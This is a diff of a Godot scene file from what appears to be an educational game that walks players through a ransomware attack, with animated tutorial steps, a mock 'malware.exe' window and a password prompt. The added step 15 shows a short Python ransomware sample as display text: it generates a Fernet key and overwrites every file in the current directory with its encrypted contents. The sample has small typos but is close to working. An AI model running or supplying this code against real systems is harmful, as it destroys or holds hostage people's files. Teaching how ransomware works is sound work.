@@ -1,11 +1,13 @@
-[gd_scene load_steps=52 format=3 uid="uid://cvlbm3qymf244"]
+[gd_scene load_steps=55 format=3 uid="uid://cvlbm3qymf244"]
 
-[ext_resource type="Script" uid="uid://wh120maqrloe" path="res://Scenes/gui/CyberattacksV2/ransomware_v2_encrypt.gd" id="1_8bd8f"]
+[ext_resource type="Script" uid="uid://bfj1dys1yrnvw" path="res://Scripts/GUI/ransowmare_encrypt.gd" id="1_pg7rw"]
 [ext_resource type="FontFile" uid="uid://bbhvwm260bx4g" path="res://Assets/Fonts/avantgarde_demi.ttf" id="2_nmigk"]
 [ext_resource type="FontFile" uid="uid://c4mm3of2mc8o5" path="res://addons/phantom_camera/fonts/Nunito-Black.ttf" id="3_vuwby"]
-[ext_resource type="Script" uid="uid://cjiu5s7y6xikc" path="res://Scenes/gui/CyberattacksV2/mawareExe_window.gd" id="4_nmigk"]
-[ext_resource type="PackedScene" uid="uid://cbqaj2456biy" path="res://Scenes/gui/next_button.tscn" id="5_7i6ny"]
-[ext_resource type="PackedScene" uid="uid://cfnlekhp378nk" path="res://Scenes/gui/back_button.tscn" id="6_6g5gb"]
+[ext_resource type="Script" uid="uid://dymocqk677j5n" path="res://Scripts/GUI/code_edit_window.gd" id="4_m28fk"]
+[ext_resource type="PackedScene" uid="uid://cbqaj2456biy" path="res://Scenes/GUI/next_button.tscn" id="5_7i6ny"]
+[ext_resource type="Script" uid="uid://3ld1620aeihn" path="res://Scenes/GUI/Ransomware/password_check_component.gd" id="5_8fnya"]
+[ext_resource type="PackedScene" uid="uid://cfnlekhp378nk" path="res://Scenes/GUI/back_button.tscn" id="6_6g5gb"]
+[ext_resource type="Theme" uid="uid://cgx7d6dgoy5t3" path="res://Themes/Arknights.tres" id="6_vb8no"]
 
 [sub_resource type="StyleBoxFlat" id="StyleBoxFlat_t4n35"]
 content_margin_left = 19.0
@@ -238,7 +240,7 @@ tracks/6/keys = {
 tracks/7/type = "value"
 tracks/7/imported = false
 tracks/7/enabled = true
-tracks/7/path = NodePath("malwareExe Window/Window/WindowContents/MarginContainer/SampleContent:visible")
+tracks/7/path = NodePath("WindowBackground/Window/WindowContents/MarginContainer/SampleContent:visible")
 tracks/7/interp = 1
 tracks/7/loop_wrap = true
 tracks/7/keys = {
@@ -250,7 +252,7 @@ tracks/7/keys = {
 tracks/8/type = "value"
 tracks/8/imported = false
 tracks/8/enabled = true
-tracks/8/path = NodePath("malwareExe Window/Window/WindowContents/WindowHeader/SampleHeader:text")
+tracks/8/path = NodePath("WindowBackground/Window/WindowContents/WindowHeader/SampleHeader:text")
 tracks/8/interp = 1
 tracks/8/loop_wrap = true
 tracks/8/keys = {
@@ -262,7 +264,7 @@ tracks/8/keys = {
 tracks/9/type = "value"
 tracks/9/imported = false
 tracks/9/enabled = true
-tracks/9/path = NodePath("malwareExe Window/Window/WindowContents/MarginContainer/ProgressBar:value")
+tracks/9/path = NodePath("WindowBackground/Window/WindowContents/MarginContainer/ProgressBar:value")
 tracks/9/interp = 1
 tracks/9/loop_wrap = true
 tracks/9/keys = {
@@ -274,7 +276,7 @@ tracks/9/keys = {
 tracks/10/type = "value"
 tracks/10/imported = false
 tracks/10/enabled = true
-tracks/10/path = NodePath("malwareExe Window:visible")
+tracks/10/path = NodePath("WindowBackground:visible")
 tracks/10/interp = 1
 tracks/10/loop_wrap = true
 tracks/10/keys = {
@@ -282,6 +284,30 @@ tracks/10/keys = {
 "transitions": PackedFloat32Array(1),
 "update": 1,
 "values": [false]
+}
+tracks/11/type = "value"
+tracks/11/imported = false
+tracks/11/enabled = true
+tracks/11/path = NodePath("WindowBackground/Window2:visible")
+tracks/11/interp = 1
+tracks/11/loop_wrap = true
+tracks/11/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
+}
+tracks/12/type = "value"
+tracks/12/imported = false
+tracks/12/enabled = true
+tracks/12/path = NodePath("WindowBackground/Window:visible")
+tracks/12/interp = 1
+tracks/12/loop_wrap = true
+tracks/12/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
 }
 
 [sub_resource type="Animation" id="Animation_oekl0"]
@@ -1843,7 +1869,7 @@ tracks/6/keys = {
 tracks/7/type = "value"
 tracks/7/imported = false
 tracks/7/enabled = true
-tracks/7/path = NodePath("malwareExe Window/Window/WindowContents/MarginContainer/SampleContent:visible")
+tracks/7/path = NodePath("WindowBackground/Window/WindowContents/MarginContainer/SampleContent:visible")
 tracks/7/interp = 1
 tracks/7/loop_wrap = true
 tracks/7/keys = {
@@ -1855,7 +1881,7 @@ tracks/7/keys = {
 tracks/8/type = "value"
 tracks/8/imported = false
 tracks/8/enabled = true
-tracks/8/path = NodePath("malwareExe Window/Window/WindowContents/WindowHeader/SampleHeader:text")
+tracks/8/path = NodePath("WindowBackground/Window/WindowContents/WindowHeader/SampleHeader:text")
 tracks/8/interp = 1
 tracks/8/loop_wrap = true
 tracks/8/keys = {
@@ -1867,7 +1893,7 @@ tracks/8/keys = {
 tracks/9/type = "value"
 tracks/9/imported = false
 tracks/9/enabled = true
-tracks/9/path = NodePath("malwareExe Window/Window/WindowContents/MarginContainer/ProgressBar:value")
+tracks/9/path = NodePath("WindowBackground/Window/WindowContents/MarginContainer/ProgressBar:value")
 tracks/9/interp = 1
 tracks/9/loop_wrap = true
 tracks/9/keys = {
@@ -1879,10 +1905,216 @@ tracks/9/keys = {
 tracks/10/type = "value"
 tracks/10/imported = false
 tracks/10/enabled = true
-tracks/10/path = NodePath("malwareExe Window:visible")
+tracks/10/path = NodePath("WindowBackground:visible")
 tracks/10/interp = 1
 tracks/10/loop_wrap = true
 tracks/10/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/11/type = "value"
+tracks/11/imported = false
+tracks/11/enabled = true
+tracks/11/path = NodePath("WindowBackground/Window2:visible")
+tracks/11/interp = 1
+tracks/11/loop_wrap = true
+tracks/11/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/12/type = "value"
+tracks/12/imported = false
+tracks/12/enabled = true
+tracks/12/path = NodePath("WindowBackground/Window:visible")
+tracks/12/interp = 1
+tracks/12/loop_wrap = true
+tracks/12/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
+}
+
+[sub_resource type="Animation" id="Animation_8fnya"]
+resource_name = "ransomware_step_15"
+length = 3.0
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["import os from cryptography.fernet 
+import fernet
+
+allfiles = [ ]
+for file in os.listdir():
+	if file == 'malware.py' or file == 'key.key' or file == ' decr.py':
+		continue
+	if os.path.isfile(file):
+		allfiles.append(file)
+print (allfiles)
+
+key = Fernet.generate_key()
+with open ('key.key', 'wb') as thekey: 
+	thekey.write(key)
+
+for file in allfiles:
+	with open(file, 'rb') as thefile:
+		content = thefile.read()
+	content_encryp = Fernet(key).encrypt(content)
+	with open(file, 'wb') as thefile: 
+		thefile.write(content_encryp)
+
+print('All your files have been encrypted')"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [""]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Body/ExplanationPanel/VBoxContainer/FoldableContainer:title")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Run the Code"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_position")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.1, 3.555)]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Body/CodeContainer/PanelContainer/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.735, 0.28)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Body/CodeContainer/PanelContainer/MarginContainer/CodeEdit:scroll_vertical")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [13.965]
+}
+tracks/7/type = "value"
+tracks/7/imported = false
+tracks/7/enabled = true
+tracks/7/path = NodePath("WindowBackground/Window/WindowContents/MarginContainer/SampleContent:visible")
+tracks/7/interp = 1
+tracks/7/loop_wrap = true
+tracks/7/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
+}
+tracks/8/type = "value"
+tracks/8/imported = false
+tracks/8/enabled = true
+tracks/8/path = NodePath("WindowBackground/Window/WindowContents/WindowHeader/SampleHeader:text")
+tracks/8/interp = 1
+tracks/8/loop_wrap = true
+tracks/8/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["malware.exe"]
+}
+tracks/9/type = "value"
+tracks/9/imported = false
+tracks/9/enabled = true
+tracks/9/path = NodePath("WindowBackground/Window/WindowContents/MarginContainer/ProgressBar:value")
+tracks/9/interp = 1
+tracks/9/loop_wrap = true
+tracks/9/keys = {
+"times": PackedFloat32Array(0, 3),
+"transitions": PackedFloat32Array(1, 1),
+"update": 0,
+"values": [0.0, 100.0]
+}
+tracks/10/type = "value"
+tracks/10/imported = false
+tracks/10/enabled = true
+tracks/10/path = NodePath("WindowBackground:visible")
+tracks/10/interp = 1
+tracks/10/loop_wrap = true
+tracks/10/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/11/type = "value"
+tracks/11/imported = false
+tracks/11/enabled = true
+tracks/11/path = NodePath("WindowBackground/Window2:visible")
+tracks/11/interp = 1
+tracks/11/loop_wrap = true
+tracks/11/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
+}
+tracks/12/type = "value"
+tracks/12/imported = false
+tracks/12/enabled = true
+tracks/12/path = NodePath("WindowBackground/Window:visible")
+tracks/12/interp = 1
+tracks/12/loop_wrap = true
+tracks/12/keys = {
 "times": PackedFloat32Array(0),
 "transitions": PackedFloat32Array(1),
 "update": 1,
@@ -1905,7 +2137,8 @@ _data = {
 &"ransomware_step_11": SubResource("Animation_x2hu1"),
 &"ransomware_step_12": SubResource("Animation_8yhgl"),
 &"ransomware_step_13": SubResource("Animation_h0h0r"),
-&"ransomware_step_14": SubResource("Animation_fkojw")
+&"ransomware_step_14": SubResource("Animation_fkojw"),
+&"ransomware_step_15": SubResource("Animation_8fnya")
 }
 
 [sub_resource type="StyleBoxFlat" id="StyleBoxFlat_h8m8q"]
@@ -1937,7 +2170,7 @@ anchor_right = 1.0
 anchor_bottom = 1.0
 grow_horizontal = 2
 grow_vertical = 2
-script = ExtResource("1_8bd8f")
+script = ExtResource("1_pg7rw")
 
 [node name="Background" type="ColorRect" parent="."]
 layout_mode = 1
@@ -2072,7 +2305,7 @@ libraries = {
 &"": SubResource("AnimationLibrary_de0th")
 }
 
-[node name="malwareExe Window" type="ColorRect" parent="."]
+[node name="WindowBackground" type="ColorRect" parent="."]
 process_mode = 3
 visible = false
 layout_mode = 1
@@ -2083,9 +2316,9 @@ grow_horizontal = 2
 grow_vertical = 2
 mouse_filter = 2
 color = Color(0, 0, 0, 0.17254902)
-script = ExtResource("4_nmigk")
+script = ExtResource("4_m28fk")
 
-[node name="Window" type="PanelContainer" parent="malwareExe Window"]
+[node name="Window" type="PanelContainer" parent="WindowBackground"]
 clip_children = 2
 layout_mode = 1
 anchors_preset = 8
@@ -2101,15 +2334,15 @@ grow_horizontal = 2
 grow_vertical = 2
 theme_override_styles/panel = SubResource("StyleBoxFlat_h8m8q")
 
-[node name="WindowContents" type="VBoxContainer" parent="malwareExe Window/Window"]
+[node name="WindowContents" type="VBoxContainer" parent="WindowBackground/Window"]
 layout_mode = 2
 
-[node name="WindowHeader" type="PanelContainer" parent="malwareExe Window/Window/WindowContents"]
+[node name="WindowHeader" type="PanelContainer" parent="WindowBackground/Window/WindowContents"]
 custom_minimum_size = Vector2(0, 30)
 layout_mode = 2
 theme_override_styles/panel = SubResource("StyleBoxFlat_pkbn6")
 
-[node name="Button" type="Button" parent="malwareExe Window/Window/WindowContents/WindowHeader"]
+[node name="Button" type="Button" parent="WindowBackground/Window/WindowContents/WindowHeader"]
 layout_mode = 2
 size_flags_horizontal = 8
 theme_override_fonts/font = ExtResource("3_vuwby")
@@ -2120,25 +2353,99 @@ theme_override_styles/disabled = SubResource("StyleBoxEmpty_31cwg")
 theme_override_styles/focus = SubResource("StyleBoxEmpty_x5n46")
 text = "X"
 
-[node name="SampleHeader" type="Label" parent="malwareExe Window/Window/WindowContents/WindowHeader"]
+[node name="SampleHeader" type="Label" parent="WindowBackground/Window/WindowContents/WindowHeader"]
 layout_mode = 2
 text = "Wow header"
 
-[node name="MarginContainer" type="MarginContainer" parent="malwareExe Window/Window/WindowContents"]
+[node name="MarginContainer" type="MarginContainer" parent="WindowBackground/Window/WindowContents"]
 layout_mode = 2
 theme_override_constants/margin_left = 5
 theme_override_constants/margin_right = 5
 
-[node name="SampleContent" type="Label" parent="malwareExe Window/Window/WindowContents/MarginContainer"]
+[node name="SampleContent" type="Label" parent="WindowBackground/Window/WindowContents/MarginContainer"]
 layout_mode = 2
 theme_override_font_sizes/font_size = 31
 text = "Contents"
 
-[node name="ProgressBar" type="ProgressBar" parent="malwareExe Window/Window/WindowContents/MarginContainer"]
+[node name="ProgressBar" type="ProgressBar" parent="WindowBackground/Window/WindowContents/MarginContainer"]
 layout_mode = 2
 size_flags_vertical = 4
 
+[node name="Window2" type="PanelContainer" parent="WindowBackground"]
+visible = false
+clip_children = 2
+layout_mode = 1
+anchors_preset = 8
+anchor_left = 0.5
+anchor_top = 0.5
+anchor_right = 0.5
+anchor_bottom = 0.5
+offset_left = -210.0
+offset_top = -105.0
+offset_right = 210.0
+offset_bottom = 105.0
+grow_horizontal = 2
+grow_vertical = 2
+theme_override_styles/panel = SubResource("StyleBoxFlat_h8m8q")
+
+[node name="WindowContents" type="VBoxContainer" parent="WindowBackground/Window2"]
+layout_mode = 2
+
+[node name="WindowHeader" type="PanelContainer" parent="WindowBackground/Window2/WindowContents"]
+custom_minimum_size = Vector2(0, 30)
+layout_mode = 2
+theme_override_styles/panel = SubResource("StyleBoxFlat_pkbn6")
+
+[node name="Button" type="Button" parent="WindowBackground/Window2/WindowContents/WindowHeader"]
+layout_mode = 2
+size_flags_horizontal = 8
+theme_override_fonts/font = ExtResource("3_vuwby")
+theme_override_styles/normal = SubResource("StyleBoxEmpty_cxtjw")
+theme_override_styles/pressed = SubResource("StyleBoxEmpty_wf7ls")
+theme_override_styles/hover = SubResource("StyleBoxEmpty_vuf0p")
+theme_override_styles/disabled = SubResource("StyleBoxEmpty_31cwg")
+theme_override_styles/focus = SubResource("StyleBoxEmpty_x5n46")
+text = "X"
+
+[node name="SampleHeader" type="Label" parent="WindowBackground/Window2/WindowContents/WindowHeader"]
+layout_mode = 2
+text = "Wow header"
+
+[node name="MarginContainer" type="MarginContainer" parent="WindowBackground/Window2/WindowContents"]
+layout_mode = 2
+theme_override_constants/margin_left = 5
+theme_override_constants/margin_right = 5
+
+[node name="PasswordCheckComponent" type="Control" parent="WindowBackground/Window2/WindowContents/MarginContainer" node_paths=PackedStringArray("password_box", "message_label")]
+layout_mode = 2
+script = ExtResource("5_8fnya")
+password_box = NodePath("../VBoxContainer/HBoxContainer/PasswordInput")
+message_label = NodePath("../VBoxContainer/Label")
+
+[node name="VBoxContainer" type="VBoxContainer" parent="WindowBackground/Window2/WindowContents/MarginContainer"]
+layout_mode = 2
+theme = ExtResource("6_vb8no")
+
+[node name="Label" type="Label" parent="WindowBackground/Window2/WindowContents/MarginContainer/VBoxContainer"]
+layout_mode = 2
+text = "Please enter the password:"
+
+[node name="HBoxContainer" type="HBoxContainer" parent="WindowBackground/Window2/WindowContents/MarginContainer/VBoxContainer"]
+layout_mode = 2
+theme_override_constants/separation = 15
+
+[node name="PasswordInput" type="TextEdit" parent="WindowBackground/Window2/WindowContents/MarginContainer/VBoxContainer/HBoxContainer"]
+custom_minimum_size = Vector2(238.385, 0)
+layout_mode = 2
+placeholder_text = "Password"
+scroll_fit_content_height = true
+
+[node name="SubmitButton" type="Button" parent="WindowBackground/Window2/WindowContents/MarginContainer/VBoxContainer/HBoxContainer"]
+layout_mode = 2
+text = "Submit"
+
 [node name="Debug" type="Control" parent="."]
+visible = false
 anchors_preset = 0
 offset_right = 40.0
 offset_bottom = 40.0
@@ -2166,5 +2473,6 @@ offset_right = 291.51337
 offset_bottom = 522.6172
 text = "Back"
 
-[connection signal="malware_window_finished" from="malwareExe Window" to="." method="_on_malware_exe_window_malware_window_finished"]
-[connection signal="pressed" from="malwareExe Window/Window/WindowContents/WindowHeader/Button" to="malwareExe Window" method="_on_button_pressed"]
+[connection signal="window_exited" from="WindowBackground" to="." method="_on_window_background_window_exited"]
+[connection signal="pressed" from="WindowBackground/Window/WindowContents/WindowHeader/Button" to="WindowBackground" method="_on_button_pressed"]
+[connection signal="pressed" from="WindowBackground/Window2/WindowContents/MarginContainer/VBoxContainer/HBoxContainer/SubmitButton" to="WindowBackground/Window2/WindowContents/MarginContainer/PasswordCheckComponent" method="_on_ransomware_decrypt_submit_button_pressed"]
